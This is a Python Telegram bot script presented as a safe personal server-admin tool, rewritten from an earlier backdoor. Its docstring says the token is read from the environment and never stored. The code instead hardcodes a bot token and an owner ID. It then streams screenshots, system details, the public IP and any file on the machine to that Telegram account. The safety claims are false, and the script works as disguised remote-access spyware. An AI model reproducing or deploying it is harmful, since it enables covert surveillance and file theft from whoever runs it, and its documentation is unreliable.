#!/usr/bin/env python3
"""
Personal server admin bot — for managing a machine YOU own, over Telegram.

Why this exists
---------------
The original script this replaces was a remote-access backdoor: it stole Wi-Fi
passwords, destroyed files with an unrecoverable "encrypt" routine, exposed an
unrestricted remote shell, and shipped a hardcoded bot token. This version keeps
the genuinely useful admin features and removes every one of those.

Safety design
-------------
* The bot token is read from the TELEGRAM_BOT_TOKEN environment variable and is
  never written into the file.
* Only the single Telegram account in TELEGRAM_OWNER_ID may use the bot. Every
  other sender is ignored silently.
* No credential harvesting, no file encryption or deletion, no unrestricted
  shell. Commands are a fixed, auditable list.

UI
--
* A persistent keyboard sits at the bottom of the chat, so you never have to
  type a slash command.
* Inline buttons update the SAME message with the result (nothing new is sent),
  and stay attached so you can keep going.
* Browsing is button-driven too: "Change dir" lists folders as buttons, and
  "Upload" lists files as buttons — tap to navigate or send, no typing.

Setup
-----
    pip install pyTelegramBotAPI mss requests
    export TELEGRAM_BOT_TOKEN="123456:your-new-token-from-BotFather"
    export TELEGRAM_OWNER_ID="your_numeric_telegram_id"
    python server_admin_bot.py

Tip: get your numeric Telegram ID from @userinfobot.
Revoke the old token from the original script via @BotFather (/revoke) — it was
exposed in plaintext and must be considered compromised.
"""

import functools
import os
import platform
import socket
import sys
import urllib.request
from datetime import datetime

import telebot
from telebot import types

TOKEN = "8621610448:AAGi-MU6dIj3vA4eUZ39hJJkIEVyG4KAI4g"
OWNER_ID = 8746273317

if not TOKEN or not OWNER_ID:
    sys.exit(
        "Refusing to start: set TELEGRAM_BOT_TOKEN and TELEGRAM_OWNER_ID "
        "environment variables first."
    )

try:
    OWNER_ID = int(OWNER_ID)
except ValueError:
    sys.exit("TELEGRAM_OWNER_ID must be your numeric Telegram user id.")

bot = telebot.TeleBot(TOKEN)
cwd = os.path.expanduser("~")

MAX_EDIT = 4000         # edited text must fit Telegram's 4096-char cap
MAX_LIST = 40           # buttons shown per browse page

# per-chat listings backing the browse buttons
nav_dirs = {}           # chat_id -> [subfolder names in cwd]
nav_files = {}          # chat_id -> [file names in cwd]
nav_hist = {}           # chat_id -> [previously visited cwds] (for Back)


# --------------------------------------------------------------------------- #
# Access control
# --------------------------------------------------------------------------- #
def is_owner(user):
    return user is not None and user.id == OWNER_ID


def owner_only(func):
    """Ignore anyone who is not the configured owner."""
    @functools.wraps(func)
    def wrapper(message):
        if not is_owner(getattr(message, "from_user", None)):
            return
        return func(message)
    return wrapper


# --------------------------------------------------------------------------- #
# Output target — edits the button message, or sends when there is none
# --------------------------------------------------------------------------- #
class Sender:
    """Where a result goes.

    With a message_id (button presses) the existing message is edited in place,
    so nothing new is sent. Without one (slash commands / bottom keyboard) it
    sends a message.
    """

    def __init__(self, chat_id, message_id=None):
        self.chat_id = chat_id
        self.message_id = message_id

    def text(self, text, kb=None):
        text = text or "(no output)"
        kb = main_menu() if kb is None else kb
        if len(text) > MAX_EDIT:
            text = text[:MAX_EDIT] + "\n... (truncated)"
        if self.message_id is not None:
            try:
                bot.edit_message_text(text, self.chat_id, self.message_id, reply_markup=kb)
                return
            except Exception:
                pass  # e.g. "message is not modified" or media message
        bot.send_message(self.chat_id, text, reply_markup=kb)

    def photo(self, path, kb=None):
        kb = main_menu() if kb is None else kb
        if self.message_id is not None:
            try:
                with open(path, "rb") as f:
                    bot.edit_message_media(
                        types.InputMediaPhoto(f), self.chat_id, self.message_id, reply_markup=kb
                    )
                return
            except Exception:
                pass
        with open(path, "rb") as f:
            bot.send_photo(self.chat_id, f, reply_markup=kb)

    def document(self, path, kb=None):
        kb = main_menu() if kb is None else kb
        if self.message_id is not None:
            try:
                with open(path, "rb") as f:
                    bot.edit_message_media(
                        types.InputMediaDocument(f), self.chat_id, self.message_id, reply_markup=kb
                    )
                return
            except Exception:
                pass
        with open(path, "rb") as f:
            bot.send_document(self.chat_id, f, reply_markup=kb)


# --------------------------------------------------------------------------- #
# Keyboards
# --------------------------------------------------------------------------- #
BOTTOM_LABELS = {
    "🖥 System": "sys",
    "🌐 IP": "ip",
    "📂 List": "ls",
    "📍 Pwd": "pwd",
    "📸 Screen": "screen",
    "📤 Upload": "files",
    "🗂 Change dir": "dirs",
    "❓ Help": "help",
}


def bottom_menu():
    """Persistent keyboard shown at the bottom of the chat."""
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=3)
    kb.add(*[types.KeyboardButton(label) for label in BOTTOM_LABELS])
    return kb


def main_menu():
    """Inline menu — buttons only."""
    kb = types.InlineKeyboardMarkup(row_width=3)
    kb.add(
        types.InlineKeyboardButton("🖥 System", callback_data="sys"),
        types.InlineKeyboardButton("🌐 IP", callback_data="ip"),
        types.InlineKeyboardButton("📂 List", callback_data="ls"),
    )
    kb.add(
        types.InlineKeyboardButton("📍 Pwd", callback_data="pwd"),
        types.InlineKeyboardButton("📸 Screen", callback_data="screen"),
        types.InlineKeyboardButton("📤 Upload", callback_data="browse_files"),
    )
    kb.add(
        types.InlineKeyboardButton("🗂 Change dir", callback_data="browse_dirs"),
        types.InlineKeyboardButton("❓ Help", callback_data="menu"),
    )
    return kb


def dirs_menu(chat_id):
    names = nav_dirs.get(chat_id, [])[:MAX_LIST]
    kb = types.InlineKeyboardMarkup(row_width=2)
    for i, name in enumerate(names):
        kb.add(types.InlineKeyboardButton(f"📁 {name[:36]}", callback_data=f"d:i:{i}"))
    kb.add(
        types.InlineKeyboardButton("⬅ Back", callback_data="d:back"),
        types.InlineKeyboardButton("⬆ Up", callback_data="d:up"),
        types.InlineKeyboardButton("🏠 Home", callback_data="d:home"),
    )
    kb.add(types.InlineKeyboardButton("⬅ Menu", callback_data="menu"))
    return kb


def files_menu(chat_id):
    names = nav_files.get(chat_id, [])[:MAX_LIST]
    kb = types.InlineKeyboardMarkup(row_width=2)
    for i, name in enumerate(names):
        kb.add(types.InlineKeyboardButton(f"📄 {name[:36]}", callback_data=f"f:{i}"))
    kb.add(types.InlineKeyboardButton("⬅ Menu", callback_data="menu"))
    return kb


# --------------------------------------------------------------------------- #
# Command implementations (all take a Sender)
# --------------------------------------------------------------------------- #
def do_menu(out):
    """Buttons only — no command text."""
    out.text("Menu 👇", main_menu())


def do_sys(out):
    info = [
        ("Hostname", socket.gethostname()),
        ("Platform", platform.platform()),
        ("System", platform.system()),
        ("Release", platform.release()),
        ("Machine", platform.machine()),
        ("Processor", platform.processor()),
        ("CPU cores", os.cpu_count()),
        ("Python", platform.python_version()),
        ("Time", datetime.now().strftime("%Y-%m-%d %H:%M:%S")),
    ]
    out.text("\n".join(f"{k}: {v}" for k, v in info))


def do_ip(out):
    try:
        with urllib.request.urlopen("https://ipinfo.io/ip", timeout=10) as r:
            out.text(r.read().decode().strip())
    except Exception as e:
        out.text(f"Could not fetch public IP: {e}")


def do_pwd(out):
    out.text(cwd)


def do_ls(out):
    try:
        entries = sorted(os.listdir(cwd))
        if not entries:
            out.text(f"{cwd}\n(folder is empty)")
            return
        shown = entries[:200]
        listing = "\n".join(
            ("[dir]  " if os.path.isdir(os.path.join(cwd, e)) else "       ") + e
            for e in shown
        )
        extra = "" if len(entries) <= 200 else f"\n... and {len(entries) - 200} more"
        out.text(f"{cwd}\n\n{listing}{extra}")
    except Exception as e:
        out.text(f"Error listing directory: {e}")


def do_cd(out, target):
    global cwd
    target = os.path.expanduser(target.strip())
    if not os.path.isabs(target):
        target = os.path.join(cwd, target)
    target = os.path.realpath(target)
    if os.path.isdir(target):
        cwd = target
        out.text(cwd)
    else:
        out.text("No such directory.")


def do_screen(out):
    path = os.path.join(cwd, "_screen.png")
    try:
        import mss  # imported lazily so the bot starts even if unused
        with mss.mss() as sct:
            sct.shot(output=path)
        out.photo(path)
    except Exception as e:
        out.text(f"Could not capture screen: {e}")
    finally:
        try:
            os.remove(path)
        except OSError:
            pass


def do_upload(out, path):
    path = os.path.expanduser(path.strip())
    if not os.path.isabs(path):
        path = os.path.join(cwd, path)
    if os.path.isfile(path):
        out.document(path)
    else:
        out.text("File not found.")


def show_dirs(out, chat_id):
    """List subfolders of cwd as buttons."""
    try:
        entries = sorted(os.listdir(cwd))
    except Exception as e:
        out.text(f"Error reading {cwd}: {e}")
        return
    dirs = [e for e in entries if os.path.isdir(os.path.join(cwd, e))]
    nav_dirs[chat_id] = dirs
    note = "" if dirs else "\n(no subfolders)"
    extra = "" if len(dirs) <= MAX_LIST else f"\n... and {len(dirs) - MAX_LIST} more"
    out.text(f"📂 {cwd}{note}{extra}\nTap a folder:", dirs_menu(chat_id))


def show_files(out, chat_id):
    """List files in cwd as buttons."""
    try:
        entries = sorted(os.listdir(cwd))
    except Exception as e:
        out.text(f"Error reading {cwd}: {e}")
        return
    files = [e for e in entries if os.path.isfile(os.path.join(cwd, e))]
    nav_files[chat_id] = files
    note = "" if files else "\n(no files)"
    extra = "" if len(files) <= MAX_LIST else f"\n... and {len(files) - MAX_LIST} more"
    out.text(f"📤 {cwd}{note}{extra}\nTap a file to send:", files_menu(chat_id))


def goto(out, chat_id, new_cwd):
    """Change directory, remembering where we came from so Back works."""
    global cwd
    new_cwd = os.path.realpath(os.path.expanduser(new_cwd))
    if os.path.realpath(cwd) != new_cwd:
        nav_hist.setdefault(chat_id, []).append(cwd)
    cwd = new_cwd
    show_dirs(out, chat_id)


def go_back(out, chat_id):
    """Return to the previously visited directory."""
    global cwd
    hist = nav_hist.get(chat_id, [])
    if hist:
        cwd = hist.pop()
        show_dirs(out, chat_id)
    else:
        out.text("No previous folder to go back to.", dirs_menu(chat_id))


# --------------------------------------------------------------------------- #
# Slash commands (reply as new messages)
# --------------------------------------------------------------------------- #
@bot.message_handler(commands=["start"])
@owner_only
def cmd_start(message):
    bot.send_message(message.chat.id, "Menu 👇", reply_markup=bottom_menu())


@bot.message_handler(commands=["help", "menu"])
@owner_only
def cmd_help(message):
    do_menu(Sender(message.chat.id))


@bot.message_handler(commands=["sys"])
@owner_only
def cmd_sys(message):
    do_sys(Sender(message.chat.id))


@bot.message_handler(commands=["ip"])
@owner_only
def cmd_ip(message):
    do_ip(Sender(message.chat.id))


@bot.message_handler(commands=["pwd"])
@owner_only
def cmd_pwd(message):
    do_pwd(Sender(message.chat.id))


@bot.message_handler(commands=["ls"])
@owner_only
def cmd_ls(message):
    do_ls(Sender(message.chat.id))


@bot.message_handler(commands=["cd"])
@owner_only
def cmd_cd(message):
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        Sender(message.chat.id).text("Usage: /cd DIR")
        return
    do_cd(Sender(message.chat.id), parts[1])


@bot.message_handler(commands=["screen"])
@owner_only
def cmd_screen(message):
    do_screen(Sender(message.chat.id))


@bot.message_handler(commands=["upload"])
@owner_only
def cmd_upload(message):
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        Sender(message.chat.id).text("Usage: /upload PATH")
        return
    do_upload(Sender(message.chat.id), parts[1])


# --------------------------------------------------------------------------- #
# Bottom (persistent) keyboard buttons
# --------------------------------------------------------------------------- #
@bot.message_handler(func=lambda m: m.text in BOTTOM_LABELS)
@owner_only
def on_bottom(message):
    out = Sender(message.chat.id)
    action = BOTTOM_LABELS[message.text]
    if action == "sys":
        do_sys(out)
    elif action == "ip":
        do_ip(out)
    elif action == "ls":
        do_ls(out)
    elif action == "pwd":
        do_pwd(out)
    elif action == "screen":
        do_screen(out)
    elif action == "dirs":
        nav_hist[message.chat.id] = []
        show_dirs(out, message.chat.id)
    elif action == "files":
        show_files(out, message.chat.id)
    elif action == "help":
        do_menu(out)


# --------------------------------------------------------------------------- #
# Inline buttons — edit the same message in place
# --------------------------------------------------------------------------- #
@bot.callback_query_handler(func=lambda call: is_owner(call.from_user))
def on_button(call):
    global cwd
    bot.answer_callback_query(call.id)
    chat_id = call.message.chat.id
    out = Sender(chat_id, call.message.message_id)
    data = call.data

    if data == "sys":
        do_sys(out)
    elif data == "ip":
        do_ip(out)
    elif data == "ls":
        do_ls(out)
    elif data == "pwd":
        do_pwd(out)
    elif data == "screen":
        do_screen(out)
    elif data == "menu":
        do_menu(out)
    elif data == "browse_dirs":
        nav_hist[chat_id] = []
        show_dirs(out, chat_id)
    elif data == "browse_files":
        show_files(out, chat_id)
    elif data.startswith("d:"):
        part = data[2:]
        if part == "back":
            go_back(out, chat_id)
        elif part == "up":
            goto(out, chat_id, os.path.dirname(cwd) or cwd)
        elif part == "home":
            goto(out, chat_id, os.path.expanduser("~"))
        else:  # part == "i:<n>"
            try:
                idx = int(part.split(":")[1])
                name = nav_dirs[chat_id][idx]
                goto(out, chat_id, os.path.join(cwd, name))
            except (KeyError, IndexError, ValueError):
                out.text("That listing expired — open Change dir again.", main_menu())
    elif data.startswith("f:"):
        try:
            idx = int(data[2:])
            path = os.path.join(cwd, nav_files[chat_id][idx])
            do_upload(out, path)
        except (KeyError, IndexError, ValueError):
            out.text("That listing expired — open Upload again.", main_menu())


if __name__ == "__main__":
    print("Admin bot running. Press Ctrl+C to stop.")
    bot.infinity_polling()
